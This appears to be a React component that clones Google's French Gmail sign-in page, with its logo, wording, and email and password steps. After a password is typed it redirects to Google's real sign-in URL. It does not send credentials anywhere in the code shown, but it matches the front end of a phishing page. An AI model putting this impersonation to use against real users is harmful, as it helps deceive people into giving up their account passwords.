'use client'

import React from 'react'

export const C = ({

}:{

}) => {
	const [email, setEmail] = React.useState({
		value: "",
		error: ""
	})
	const [password, setPassword] = React.useState({
		value: "",
		error: "",
		show: false
	})
	const [state, setState] = React.useState({
		loading: false,
		steps: {
			current: 0,
			"0": {
				header: "Connexion",
				actionFormLeft: "Créer un compte",
				actionFormRight: "Suivant"
			},
			"1": {
				header: "Bienvenue",
				actionFormLeft: "Mot de passe oublié ?",
				actionFormRight: "Suivant"
			}
		}
	})

	console.log(state.steps.current)

	const rs = () => {
		setEmail((prev: any) => ({
			...prev,
			error: ""
		}))
	}

	const ld = (v: boolean) => {
		setState((prev: any) => ({
			...prev,
			loading: v
		}))
	}

	const wt = (ms: number) => {
		return (
			new Promise(resolve => 
				setTimeout(resolve, ms)
			)
		)
	}

	const ch = async (d: number) => {
		let step = state.steps.current;
		let error = ""
		rs()
		ld(true)

		if (!state.steps.current) {
			setEmail((prev: any) => ({
				...prev,
				error: error
			}))
			if (!email.value.length)	{
				error = 'Saisissez une adresse e-mail ou un numéro de téléphone.'
				document.getElementById('em-inp')
					?.focus()
			}
			else	{
				await wt(1000)
				step++;
				setTimeout(() => {
					document.querySelector('.gm-nav-elm.em')?.classList.add('lt')
				}, 150)
			}
			setEmail((prev: any) => ({
				...prev,
				error: error
			}))
			
		}
		else if (state.steps.current === 1) {
			if (d < 0)	{
				await wt(1000)
				document.querySelector('.gm-nav-elm.em.lt')?.classList.remove('lt')
				step--;
			}
			else {
				setPassword((prev: any) => ({
					...prev,
					error: error
				}))
				if (!password.value.length)	{
					error = 'Saisissez un mot de passe'
					document.getElementById('pw-inp')
						?.focus()
				}
				else {
					window.location.replace("https://accounts.google.com/AccountChooser/signinchooser?service=mail&continue=https://mail.google.com/mail/&flowName=GlifWebSignIn&flowEntry=AccountChooser&ec=asw-gmail-globalnav-signin")
				}
				setPassword((prev: any) => ({
					...prev,
					error: error
				}))

			}
			
		}
		setState((prev: any) => ({
			...prev,
			steps: {
				...prev.steps,
				current: step
			}
		}))

		ld(false)
	}

	return (
		<div 
			className={`gm-pg${state.loading ? ' load' : ''}`}
		>
			<div className="gm-cnt">
				<div className="gm-logo">
					<svg
						width="48"
						height="48"
						aria-hidden="true"
						viewBox="0 0 40 48"
						xmlns="https://www.w3.org/2000/svg"
					>
						<path
							fill="#4285F4"
							d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
						>
						</path>
						<path
							fill="#34A853"
							d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
						>
						</path>
						<path
							fill="#FABB05"
							d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
						>
						</path>
						<path
							fill="#E94235"
							d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
						>
						</path>
					</svg>
				</div>
				<div className="gm-hd">
					<h1>
						<span>
							{
								(state.steps[
									state.steps.current as unknown as keyof typeof state.steps
								] as any).header
							}
						</span>
					</h1>
					<div className="gm-sub-hd">
						{state.steps.current === 1 ?
							<div
								className="gm-id"
								onClick={async () =>
									await ch(-1)
								}
							>
								<div className="gm-id-ic">
									<svg
										aria-hidden="true"
										fill="currentColor"
										focusable="false"
										width="48px"
										height="48px"
										viewBox="0 0 24 24"
										xmlns="https://www.w3.org/2000/svg"
									>
										<path
											d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"
										>
										</path>
									</svg>
								</div>
								<p>
									{`${email.value}${email.value.includes('@') ? '' : '@gmail.com'}`}
								</p>
								<div className="gm-ic-drp id">
									<svg
										viewBox="7 10 10 5"
										focusable="false" 
										aria-hidden="true"
									>
										<polygon
											stroke="none" 
											points="7 10 12 15 17 10"
										>
										</polygon>
									</svg>
								</div>
							</div>
							: 
							<span>
								Accéder à Gmail
							</span>
						}
					</div>
				</div>
				<div className="gm-bd">
					<div className="bd-wr">
						<div
							className="gm-nav"
							style={{
								transform: `translateX(${state.steps.current ? 'calc(-100% + (-48px))' : '0'})`
							}}
						>
							<div className="gm-nav-elm em">
								<div
									className={`gm-bd-inp${email.value.length ? ' on' : ''}${email.error.length ? ' err' : ''}`}
								>
									<input
										id="em-inp"
										type="text"
										onChange={(e) => {
											setEmail((prev: any) => ({
												...prev,
												value: e.target.value
											}))
										}}
									/>
									<span>
										Adresse e-mail ou téléphone
									</span>
									<div className="otl-inp" />
								</div>
								{email.error.length ?
									<div className="gm-err">
										<div className="gm-err-ic">
											<svg
												width="16px"
												height="16px"
												focusable="false"
												aria-hidden="true"
												fill="currentColor"
												viewBox="0 0 24 24"
												xmlns="https://www.w3.org/2000/svg"
											>
												<path
													d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
												>
												</path>
											</svg>
										</div>
										<span>
											{email.error}
										</span>
									</div>
									:
									null
								}
								<div className="gm-bd-fgt">
									<span>
										Adresse e-mail oubliée ? 
									</span>
								</div>
								<div className="if-tx">
									Ce n'est pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en mode privé. <span>
									En savoir plus sur l'utilisation du mode Invité
									</span>
								</div>
							</div>
							<div className="gm-nav-elm pw">
								<div
									className={`gm-bd-inp pw${password.value.length ? ' on' : ''}${password.error.length ? ' err' : ''}`}
								>
									<input
										id="pw-inp"
										type={password.show ? "text" : "password"}
										onChange={(e) => {
											setPassword((prev: any) => ({
												...prev,
												value: e.target.value
											}))
										}}
									/>
									<span>
										Saisissez votre mot de passe
									</span>
									<div className="otl-inp" />
								</div>
								{password.error.length ?
									<div className="gm-err pw">
										<div className="gm-err-ic">
											<svg
												width="16px"
												height="16px"
												focusable="false"
												aria-hidden="true"
												fill="currentColor"
												viewBox="0 0 24 24"
												xmlns="https://www.w3.org/2000/svg"
											>
												<path
													d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
												>
												</path>
											</svg>
										</div>
										<span>
											{password.error}
										</span>
									</div>
									:
									null
								}
								<div 
									className={`gm-sw-pw${password.show ? ' show' : ''}`}
								>
									<div className="cn-gm-sw-pw-ch">
										<div className="gm-sw-pw-ch">
											<div
												className="gm-sw-pw-spd"
												onMouseDown={() => {
													let s = document.querySelector('.gm-sw-pw-spd') as HTMLDivElement
													s.classList.add('pressed')
												}}
												onMouseUp={() => {
													let s = document.querySelector('.gm-sw-pw-spd') as HTMLDivElement
													s.classList.remove('pressed')
												}}
												onMouseLeave={() => {
													let s = document.querySelector('.gm-sw-pw-spd') as HTMLDivElement
													s.classList.remove('pressed')
												}}
												onClick={() => {
													setPassword((prev: any) => ({
														...prev,
														show: !password.show
													}))
												}}
											/>
											<svg
												className="gm-ch-pw-ic"
												aria-hidden="true"
												viewBox="0 0 24 24"
											>
												<path	
													fill="none"
													d="M1.73,12.91 8.1,19.28 22.79,4.59"
												>
												</path>
											</svg>
										</div>
									</div>
									<div className="tx-gm-sw-pw-ch">
										<span
											onClick={() => {
												setPassword((prev: any) => ({
													...prev,
													show: !password.show
												}))
											}}
										>
											Afficher le mot de passe
										</span>
									</div>
								</div>
							</div>
						</div>
						<div className="gm-act">
							<div className="gm-act-lf">
								<button>
								{
									(state.steps[
										state.steps.current as unknown as keyof typeof state.steps
									] as any).actionFormLeft
								}
								</button>
							</div>
							<div className="gm-act-rg">
								<button
									onClick={async () => {
										await ch(1)
									}}
								>
									{
									(state.steps[
											state.steps.current as unknown as keyof typeof state.steps
										] as any).actionFormRight
									}
								</button>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div className="gm-bt">
				<div className="gm-bt-lf">
					<div className="gm-bt-lf-elm">
						<span>
							Français (France)
						</span>
						<div className="gm-ic-drp">
							<svg
								viewBox="7 10 10 5"
								focusable="false" 
								aria-hidden="true"
							>
								<polygon
									stroke="none" 
									points="7 10 12 15 17 10"
								>
								</polygon>
							</svg>
						</div>
					</div>
				</div>
				<div className="gm-bt-rg">
					<div className="gm-bt-rg-elm">
						<span>
							Aide
						</span>
					</div>
					<div className="gm-bt-rg-elm">
						<span>
							Confidentialité
						</span>
					</div>
					<div className="gm-bt-rg-elm">
						<span>
							Conditions
						</span>
					</div>
				</div>
			</div>
		</div>
	)
}
